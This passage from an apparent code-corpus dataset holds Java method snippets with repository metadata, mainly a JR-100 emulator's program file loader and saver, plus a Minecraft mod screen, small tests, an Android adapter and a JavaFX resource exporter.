"modifiers": ["private"], "return_type": "int", "snippet": "    private int readInteger(InputStream in, byte[] buffer, int min, int max, String attr)            throws InvalidFormatException, EOFException, IOException {        int buflen;        buflen = in.read(buffer, 0, 4);        if (buflen == -1) {            throw new EOFException();        }        else if (buflen < 4) {            throw new InvalidFormatException(attr + \"\u306e\u9577\u3055\u3092\u8aad\u307f\u53d6\u308c\u307e\u305b\u3093\u3067\u3057\u305f\u3002(\" + buflen + \")\");        }        int value = convertLEToInteger(buffer, 0, 4);        if (value < min) {            throw new InvalidFormatException(attr + \"\u306e\u9577\u3055(\" + value + \")\u304c\u6700\u5c0f\u5024(\" + max + \")\u3088\u308a\u5c0f\u3055\u3044\u3067\u3059\u3002\");        }        if (value > max) {            throw new InvalidFormatException(attr + \"\u306e\u9577\u3055(\" + value + \")\u304c\u6700\u5927\u5024(\" + max + \")\u3092\u8d85\u3048\u3066\u3044\u307e\u3059\u3002\");        }        return value;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "writeInteger", "params": ["OutputStream", "int"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeInteger(OutputStream out, int value) throws IOException {        out.write(value & 0xff);        out.write((value & 0xff00) >> 8);        out.write((value & 0xff0000) >> 16);        out.write((value & 0xff000000) >> 24);    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "readBytes", "params": ["InputStream", "byte", "int", "String"], "throws": ["InvalidFormatException", "EOFException", "IOException"], "modifiers": ["private"], "return_type": "byte", "snippet": "    private byte[] readBytes(InputStream in, byte[] buffer, int length, String attr)            throws InvalidFormatException, EOFException, IOException {        int buflen;        buflen = in.read(buffer, 0, length);        if (buflen == -1) {            throw new EOFException();        }        else if (buflen < length) {            throw new InvalidFormatException(attr + \"\u3092\u8aad\u307f\u8fbc\u3081\u307e\u305b\u3093\u3067\u3057\u305f\u3002(\" + buflen + \")\");        }        return buffer;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "writeBytes", "params": ["OutputStream", "byte"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeBytes(OutputStream out, byte[] data) throws IOException {        for (int i = 0; i < data.length; i++) {            out.write(data[i]);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "readUTF8String", "params": ["InputStream", "byte", "int", "String"], "throws": ["InvalidFormatException", "EOFException", "IOException"], "modifiers": ["private"], "return_type": "String", "snippet": "    private String readUTF8String(InputStream in, byte[] buffer, int maxlen, String attr)            throws InvalidFormatException, EOFException, IOException {        int buflen;        buflen = in.read(buffer, 0, 4);        if (buflen == -1) {            throw new EOFException();        }        else if (buflen < 4) {            throw new InvalidFormatException(attr + \"\u306e\u9577\u3055\u3092\u8aad\u307f\u53d6\u308c\u307e\u305b\u3093\u3067\u3057\u305f\u3002(\" + buflen + \")\");        }        int len = convertLEToInteger(buffer, 0, 4);        if (len > maxlen) {            throw new InvalidFormatException(attr + \"\u306e\u9577\u3055\u304c\u9577\u3059\u304e\u307e\u3059\u3002(\" + len + \")\");        }        buflen = in.read(buffer, 0, len);        if (buflen != len) {            throw new InvalidFormatException(attr + \"\u3092\u8aad\u307f\u53d6\u308c\u307e\u305b\u3093\u3067\u3057\u305f\u3002(\" + buflen + \")\");        }        return new String(buffer, 0, len, \"UTF-8\");    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "writeUTF8String", "params": ["OutputStream", "String"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void writeUTF8String(OutputStream out, String str) throws IOException {        if (str != null && !str.equals(\"\")) {            byte[] bytes = str.getBytes(\"UTF-8\");            writeInteger(out, bytes.length);            writeBytes(out, bytes);        }        else {            writeInteger(out, 0);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "convertLEToInteger", "params": ["byte", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int convertLEToInteger(byte[] b, int off, int len) {        if (off + len > b.length) {            throw new IndexOutOfBoundsException();        }        if (len == 4) {            return (b[off] & 0xff)                    + ((b[off + 1] & 0xff) << 8)                    + ((b[off + 2] & 0xff) << 16)                    + ((b[off + 3] & 0xff) << 24);        }        else if (len == 0) {            return 0;        }        else if (len == 1) {            return b[off];        }        else if (len == 2) {            return (b[off] & 0xff)                    + ((b[off + 1] & 0xff) << 8);        }        else if (len == 3) {            return (b[off] & 0xff)                    + ((b[off + 1] & 0xff) << 8)                    + ((b[off + 2] & 0xff) << 16);        }        else {            return (b[off] & 0xff)                    + ((b[off + 1] & 0xff) << 8)                    + ((b[off + 2] & 0xff) << 16)                    + ((b[off + 3] & 0xff) << 24);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "load_jr100", "params": ["MemorySystem"], "throws": null, "modifiers": ["public"], "return_type": "Program", "snippet": "    public Program load_jr100(MemorySystem ms) {        Program p = new Program(ms);        byte[] buffer = new byte[4];        try (FileInputStream in = new FileInputStream(file)) {            checkMagic(in, buffer);            int version = readInteger(in, buffer, MIN_VERSION, MAX_VERSION, \"\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u30d0\u30fc\u30b8\u30e7\u30f3\");            if (version == 1) {                load1(in, p);            }            else if (version == 2) {                load2(in, p);            }            else {                throw new AssertionError(\"invalid version\");            }        }        catch (FileNotFoundException e) {            setErrorStatus(STATUS_FILE_NOT_FOUND, e.getMessage());            return p;        }        catch (InvalidFormatException e) {            setErrorStatus(STATUS_INVALID_FORMAT, e.getMessage());            return p;        }        catch (IOException e) {            setErrorStatus(STATUS_IO_ERROR, e.getMessage());            return p;        }        setErrorStatus(STATUS_SUCCESS, null);        return p;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "load1", "params": ["InputStream", "Program"], "throws": ["InvalidFormatException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void load1(InputStream in, Program p) throws InvalidFormatException, IOException {        byte[] buffer = new byte[MAX_BUFFER_SIZE];        MemorySystem ms = p.getMemorySystem();        try {            p.setName(readUTF8String(in, buffer, PROG_MAX_PROGRAM_NAME_LENGTH, \"\u30d7\u30ed\u30b0\u30e9\u30e0\u540d\"));            int start_address = readInteger(in, buffer, 0, PROG_MAX_PROGRAM_LENGTH, \"\u958b\u59cb\u30a2\u30c9\u30ec\u30b9\");            int length = readInteger(in, buffer, 0, PROG_MAX_PROGRAM_LENGTH, \"\u30d7\u30ed\u30b0\u30e9\u30e0\u9577\");            if (start_address + length > PROG_MAX_PROGRAM_LENGTH) {                throw new InvalidFormatException(\"\u7d42\u4e86\u30a2\u30c9\u30ec\u30b9(\" + (start_address + length) + \")\u304c\u5927\u304d\u3059\u304e\u307e\u3059\u3002\");            }            int flag = readInteger(in, buffer, Integer.MIN_VALUE, Integer.MAX_VALUE, \"\u30d5\u30e9\u30b0\");            if (flag == 0) {                p.setBasicArea(true);            }            else {                p.addAddressRegion(start_address, start_address + length - 1);                p.setBasicArea(false);            }            readBytes(in, buffer, length, \"\u30d7\u30ed\u30b0\u30e9\u30e0\");            int end_address = start_address + length - 1;            for (int i = start_address; i <= end_address; i++) {                ms.store8(i, buffer[i - start_address]);            }            if (flag == 0) {                ms.store8(end_address + 1, (byte)0xdf);                ms.store8(end_address + 2, (byte)0xdf);                ms.store8(end_address + 3, (byte)0xdf);                ms.store8(0x0006, (byte)((end_address >> 8) & 0xff));                ms.store8(0x0007, (byte)(end_address & 0xff));                ms.store8(0x0008, (byte)(((end_address + 1) >> 8) & 0xff));                ms.store8(0x0009, (byte)((end_address + 1) & 0xff));                ms.store8(0x000a, (byte)(((end_address + 2) >> 8) & 0xff));                ms.store8(0x000b, (byte)((end_address + 2) & 0xff));                ms.store8(0x000c, (byte)(((end_address + 3) >> 8) & 0xff));                ms.store8(0x000d, (byte)((end_address + 3) & 0xff));                p.setBasicArea(true);            }        }        catch (EOFException e) {            throw new InvalidFormatException(\"\u30d5\u30a1\u30a4\u30eb\u304c\u4e0d\u5b8c\u5168\u3067\u3059\u3002\");        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "load2", "params": ["InputStream", "Program"], "throws": ["InvalidFormatException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void load2(InputStream in, Program p) throws InvalidFormatException, IOException {        byte[] buffer = new byte[MAX_BUFFER_SIZE];        MemorySystem ms = p.getMemorySystem();        int section_id;        int section_length;        int count_pnam = 0;        int count_cmnt = 0;        int count_pbas = 0;        int count_pbin = 0;        while (true) {            try {                section_id = readInteger(in, buffer, Integer.MIN_VALUE, Integer.MAX_VALUE, \"\u30bb\u30af\u30b7\u30e7\u30f3\u540d\");            }            catch (EOFException e) {                break;            }            section_length = readInteger(in, buffer, 0, Integer.MAX_VALUE, \"\u30bb\u30af\u30b7\u30e7\u30f3\u9577\");            if (section_id == SECTION_PNAM) {                if (count_pnam == 1) {                    in.skip(section_length);                    continue;                }                count_pnam++;                String name = readUTF8String(in, buffer, PROG_MAX_PROGRAM_NAME_LENGTH, \"\u30d7\u30ed\u30b0\u30e9\u30e0\u540d\");                p.setName(name);                if (section_length != name.getBytes(\"UTF-8\").length + 4) {                    throw new InvalidFormatException(\"\u30bb\u30af\u30b7\u30e7\u30f3PNAM\u306e\u9577\u3055\u304c\u4e0d\u6b63\u3067\u3059\u3002(\" + section_length + \")\");                }            }            else if (section_id == SECTION_PBAS) {                if (count_pbas == 1) {                    in.skip(section_length);                    continue;                }                count_pbas++;                int start_address = JR100.ADDRESS_START_OF_BASIC_PROGRAM;                int program_length = readInteger(in, buffer, 0, PROG_MAX_PROGRAM_LENGTH, \"BASIC\u30d7\u30ed\u30b0\u30e9\u30e0\u9577\");                if (start_address + program_length > PROG_MAX_PROGRAM_LENGTH) {                    throw new InvalidFormatException(\"\u7d42\u4e86\u30a2\u30c9\u30ec\u30b9(\" + (start_address + program_length) + \")\u304c\u5927\u304d\u3059\u304e\u307e\u3059\u3002\");                }                readBytes(in, buffer, program_length, \"BASIC\u30d7\u30ed\u30b0\u30e9\u30e0\");                int end_address = start_address + program_length - 1;                for (int addr = start_address; addr <= end_address; addr++) {                    ms.store8(addr, buffer[addr - start_address]);                }                ms.store8(end_address + 1, (byte)0xdf);                ms.store8(end_address + 2, (byte)0xdf);                ms.store8(end_address + 3, (byte)0xdf);                ms.store8(0x0006, (byte)((end_address >> 8) & 0xff));                ms.store8(0x0007, (byte)(end_address & 0xff));                ms.store8(0x0008, (byte)(((end_address + 1) >> 8) & 0xff));                ms.store8(0x0009, (byte)((end_address + 1) & 0xff));                ms.store8(0x000a, (byte)(((end_address + 2) >> 8) & 0xff));                ms.store8(0x000b, (byte)((end_address + 2) & 0xff));                ms.store8(0x000c, (byte)(((end_address + 3) >> 8) & 0xff));                ms.store8(0x000d, (byte)((end_address + 3) & 0xff));                p.setBasicArea(true);                if (section_length != program_length + 4) {                    throw new InvalidFormatException(\"\u30bb\u30af\u30b7\u30e7\u30f3PBAS\u306e\u9577\u3055\u304c\u4e0d\u6b63\u3067\u3059\u3002(\" + section_length + \")\");                }            }            else if (section_id == SECTION_PBIN) {                if (count_pbin == PROG_MAX_BINARY_SECTIONS) {                    in.skip(section_length);                    continue;                }                count_pbin++;                int start_addr = readInteger(in, buffer, 0, PROG_MAX_PROGRAM_LENGTH, \"\u958b\u59cb\u30a2\u30c9\u30ec\u30b9\");                int data_length = readInteger(in, buffer, 0, PROG_MAX_PROGRAM_LENGTH, \"\u30c7\u30fc\u30bf\u9577\");                if (start_addr + data_length > PROG_MAX_PROGRAM_LENGTH) {                    throw new InvalidFormatException(\"\u7d42\u4e86\u30a2\u30c9\u30ec\u30b9(\" + (start_addr + data_length) + \")\u304c\u5927\u304d\u3059\u304e\u307e\u3059\u3002\");                }                readBytes(in, buffer, data_length, \"\u30de\u30b7\u30f3\u8a9e\u30c7\u30fc\u30bf\");                for (int addr = start_addr; addr < start_addr + data_length; addr++) {                    ms.store8(addr, buffer[addr - start_addr]);                }                String comment = readUTF8String(in, buffer, PROG_MAX_COMMENT_LENGTH, \"\u30a2\u30c9\u30ec\u30b9\u7bc4\u56f2\u306e\u30b3\u30e1\u30f3\u30c8\");                p.addAddressRegion(start_addr, start_addr + data_length - 1, comment);                if (section_length != data_length + 4 + comment.getBytes(\"UTF-8\").length + 4) {                    throw new InvalidFormatException(\"\u30bb\u30af\u30b7\u30e7\u30f3PBIN\u306e\u9577\u3055\u304c\u4e0d\u6b63\u3067\u3059\u3002(\" + section_length + \")\");                }            }            else if (section_id == SECTION_CMNT) {                if (count_cmnt == 1) {                    in.skip(section_length);                    continue;                }                count_cmnt++;                String comment = readUTF8String(in, buffer, PROG_MAX_COMMENT_LENGTH, \"\u30b3\u30e1\u30f3\u30c8\");                p.setComment(comment);                if (section_length != comment.getBytes().length + 4) {                    throw new InvalidFormatException(\"\u30bb\u30af\u30b7\u30e7\u30f3CMNT\u306e\u9577\u3055\u304c\u4e0d\u6b63\u3067\u3059\u3002(\" + section_length + \")\");                }            }            else {                in.skip(section_length);            }        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "save_jr100", "params": ["Program", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void save_jr100(Program p, int version) {        if (p == null) {            return ;        }        try (FileOutputStream out = new FileOutputStream(file)) {            writeMagic(out);            writeInteger(out, version);            if (version == 1) {                save1(out, p);            }            else if (version == 2) {                save2(out, p);            }            else {                return ;            }        }        catch (FileNotFoundException e) {            setErrorStatus(STATUS_FILE_NOT_FOUND, e.getMessage());            return;        }        catch (InvalidFormatException e) {            setErrorStatus(STATUS_INVALID_FORMAT, e.getMessage());            return;        }        catch (IOException e) {            setErrorStatus(STATUS_IO_ERROR, e.getMessage());            return;        }        setErrorStatus(STATUS_SUCCESS, null);    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "save1", "params": ["OutputStream", "Program"], "throws": ["InvalidFormatException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void save1(OutputStream out, Program p) throws InvalidFormatException, IOException {        MemorySystem ms = p.getMemorySystem();        ArrayList<AddressRegion> r = p.getAllAddressRegions();        if ((p.hasBasicArea() && r.size() != 0) || (!p.hasBasicArea() && r.size() != 1)) {            throw new InvalidFormatException(                    \"\u3053\u306e\u30d7\u30ed\u30b0\u30e9\u30e0\u306f\u30d0\u30fc\u30b8\u30e7\u30f31\u5f62\u5f0f\u3067\u306f\u4fdd\u5b58\u3067\u304d\u307e\u305b\u3093\u3002BASIC\u9818\u57df\u304b\u30d0\u30a4\u30ca\u30ea\u9818\u57df\u306e\u3044\u305a\u308c\u304b1\u3064\u306e\u307f\u683c\u7d0d\u3067\u304d\u307e\u3059\u3002\");        }        writeUTF8String(out, p.getName());        int start_addr;        int end_addr;        int flag;        if (p.hasBasicArea()) {            start_addr = JR100.ADDRESS_START_OF_BASIC_PROGRAM;            end_addr = ms.load16(JR100.WORKAREA_END_OF_BASIC_PROGRAM);            flag = 0;        }        else {            start_addr = r.get(0).getStartAddress();            end_addr = r.get(0).getEndAddress();            flag = 1;        }        writeInteger(out, start_addr);        writeInteger(out, end_addr - start_addr + 1);        writeInteger(out, flag);        byte[] data = new byte[end_addr - start_addr + 1];        for (int addr = start_addr; addr <= end_addr; addr++) {            data[addr - start_addr] = ms.load8(addr);        }        writeBytes(out, data);    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "save2", "params": ["OutputStream", "Program"], "throws": ["InvalidFormatException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void save2(OutputStream out, Program p) throws InvalidFormatException, IOException {        MemorySystem ms = p.getMemorySystem();        ArrayList<AddressRegion> regions = p.getAllAddressRegions();        String name = p.getName();        if (name != null && !name.equals(\"\")) {            writeInteger(out, SECTION_PNAM);            writeInteger(out, 4 + name.getBytes(\"UTF-8\").length);            writeUTF8String(out, name);        }        String comment = p.getComment();        if (comment != null && !comment.equals(\"\")) {            byte[] bytes = comment.getBytes(\"UTF-8\");            writeInteger(out, SECTION_CMNT);            writeInteger(out, 4 + bytes.length);            writeInteger(out, bytes.length);            writeBytes(out, bytes);        }        if (p.hasBasicArea()) {            int start_addr;            int end_addr;            start_addr = JR100.ADDRESS_START_OF_BASIC_PROGRAM;            end_addr = ms.load16(JR100.WORKAREA_END_OF_BASIC_PROGRAM);            writeInteger(out, SECTION_PBAS);            writeInteger(out, 4 + (end_addr - start_addr + 1));            writeInteger(out, end_addr - start_addr + 1);            byte[] data = new byte[end_addr - start_addr + 1];            for (int addr = start_addr; addr <= end_addr; addr++) {                data[addr - start_addr] = ms.load8(addr);            }            writeBytes(out, data);        }        int count = 0;        for (AddressRegion r : regions) {            int start_addr = r.getStartAddress();            int end_addr = r.getEndAddress();            String region_comment = r.getComment();            writeInteger(out, SECTION_PBIN);            writeInteger(out, 4 + (end_addr - start_addr + 1) + 4 + region_comment.getBytes(\"UTF-8\").length);            writeInteger(out, start_addr);            writeInteger(out, end_addr - start_addr + 1);            byte[] data = new byte[end_addr - start_addr + 1];            for (int addr = start_addr; addr <= end_addr; addr++) {                data[addr - start_addr] = ms.load8(addr);            }            writeBytes(out, data);            writeUTF8String(out, region_comment);            count++;            if (count == PROG_MAX_BINARY_SECTIONS) {                break;            }        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/file/ProgFormatFile.java", "stars": "4", "class": {"name": "ProgFormatFile", "extends": "DataFile", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init() {        super.init();        this.minecraft.keyboard.enableRepeatEvents(true);        int i = this.width / 2;        int j = this.height / 2;        this.nameField = new TextFieldWidget(this.font, i - 51, j, 103, 12, I18n.translate(\"container.repair\"));        this.nameField.setText(cameraEntity.getDisplayName().asString());        this.nameField.setFocusUnlocked(false);        this.nameField.changeFocus(true);        this.nameField.setMaxLength(35);        this.children.add(this.nameField);        this.setInitialFocus(this.nameField);    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "resize", "params": ["MinecraftClient", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void resize(MinecraftClient client, int width, int height) {        String string = this.nameField.getText();        this.init(client, width, height);        this.nameField.setText(string);    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "removed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removed() {        super.removed();        this.minecraft.keyboard.enableRepeatEvents(false);    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "keyPressed", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {        if (keyCode == 256) {            if (!this.nameField.getText().isEmpty()) {                String string = this.nameField.getText();                cameraEntity.setName(string);            }            this.minecraft.player.closeScreen();        }        return !this.nameField.keyPressed(keyCode, scanCode, modifiers) && !this.nameField.isActive() ? super.keyPressed(keyCode, scanCode, modifiers) : true;    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "drawForeground", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void drawForeground(int mouseX, int mouseY) {        RenderSystem.disableBlend();        this.font.draw(this.title.asFormattedString(), 60.0F, 6.0F, 4210752);    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "onRenamed", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onRenamed(String name) {    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "render", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void render(int mouseX, int mouseY, float delta) {        this.renderBackground();        super.render(mouseX, mouseY, delta);        RenderSystem.disableBlend();        this.nameField.render(mouseX, mouseY, delta);    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "drawBackground", "params": ["float", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void drawBackground(float delta, int mouseX, int mouseY) {        RenderSystem.color4f(1.0F, 1.0F, 1.0F, 1.0F);    }", "url": "https://raw.githubusercontent.com/Rushmead/Fabric-NDI/master/src/main/java/dev/imabad/fabricndi/screens/NameScreen.java", "stars": "5", "class": {"name": "NameScreen", "extends": "Screen", "implements": null, "modifiers": ["public"]}}, {"method_name": "test", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test(){        System.out.println(I18nUtil.getString(\"admin_name\"));        System.out.println(I18nUtil.getMultString(\"admin_name\", \"admin_name_full\"));        System.out.println(I18nUtil.getMultString());    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/util/I18nUtilTest.java", "stars": "1", "class": {"name": "I18nUtilTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {        return 10;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/CopyAdapter.java", "stars": "1", "class": {"name": "CopyAdapter", "extends": "MyAdapter", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {        return new ViewHolder();    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/CopyAdapter.java", "stars": "1", "class": {"name": "CopyAdapter", "extends": "MyAdapter", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "onBindView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onBindView(int position) {        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/CopyAdapter.java", "stars": "1", "class": {"name": "ViewHolder", "extends": "MyAdapter", "implements": null, "modifiers": ["final"]}}, {"method_name": "distribuer_devrait_persister_les_distributions_de_masques", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void distribuer_devrait_persister_les_distributions_de_masques() {        // Given        DistributionMasque distributionMasque1 = DistributionMasqueFixture.aDistributionMasque(4);        DistributionMasque distributionMasque2 = DistributionMasqueFixture.aDistributionMasque(20);        // When        distribuerMasques.distribuer(List.of(distributionMasque1, distributionMasque2));        // Then        verify(distributionMasquePersistance).persister(List.of(distributionMasque1, distributionMasque2));    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/use_cases/DistribuerMasquesTest.java", "stars": "5", "class": {"name": "DistribuerMasquesTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getFXMLLoaderAndExport", "params": ["Class", "String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "FXMLLoader", "snippet": "    public @NotNull FXMLLoader getFXMLLoaderAndExport(@NotNull final Class resourceAccessor,                                                      @NotNull final String fxmlPath,                                                      @NotNull final String remotePath) throws Exception {        return new FXMLLoader(exportResource(resourceAccessor, fxmlPath, remotePath).toURI().toURL());    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/gui/GuiStyleLoader.java", "stars": "2", "class": {"name": "GuiStyleLoader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "exportResource", "params": ["Class", "String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "File", "snippet": "    public @NotNull File exportResource(@NotNull final Class resourceAccessor,                                        @NotNull final String localPath,                                        @NotNull final String remotePath) throws Exception {        final File remoteResource = new File(remotePath, localPath);        if (!remoteResource.exists()) {            remoteResource.getParentFile().mkdirs();            exportResource(resourceAccessor, localPath, remoteResource);        }        return remoteResource;    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/gui/GuiStyleLoader.java", "stars": "2", "class": {"name": "GuiStyleLoader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "exportResource", "params": ["Class", "String", "File"], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void exportResource(@NotNull final Class resourceAccessor,                                @NotNull final String localPath,                                @NotNull final File distFile) throws Exception {        try (InputStream localStream = resourceAccessor.getResourceAsStream(localPath);             OutputStream remoteStream = new FileOutputStream(distFile)) {            if (localStream == null)                throw new Exception(\"Cannot get resource \\\"\" + localPath + \"\\\" from Jar file.\");            final byte[] buffer = new byte[4096];            int readBytes;            while ((readBytes = localStream.read(buffer)) > 0)                remoteStream.write(buffer, 0, readBytes);        }    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/gui/GuiStyleLoader.java", "stars": "2", "class": {"name": "GuiStyleLoader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkStyleVersion", "params": ["String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean checkStyleVersion(@NotNull final String path,                                     @NotNull final String currentVersion) throws Exception {        final File file = new File(path, \"style.ver\");        if (file.exists()) {            final byte[] encoded = Files.readAllBytes(Paths.get(file.getPath()));            final String userStyleVer = new String(encoded, StandardCharsets.UTF_8);            return userStyleVer.equals(currentVersion);        }        file.getParentFile().mkdirs();        try (OutputStream target = new FileOutputStream(file)) {            byte[] bytes = currentVersion.getBytes(StandardCharsets.UTF_8);            target.write(bytes, 0, bytes.length);        }        return false;    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/gui/GuiStyleLoader.java", "stars": "2", "class": {"name": "GuiStyleLoader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "equals", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object o) {        if (this == o) {            return true;        }        if (o == null || getClass() != o.getClass()) {            return false;        }        ThemeProperty that = (ThemeProperty) o;        return 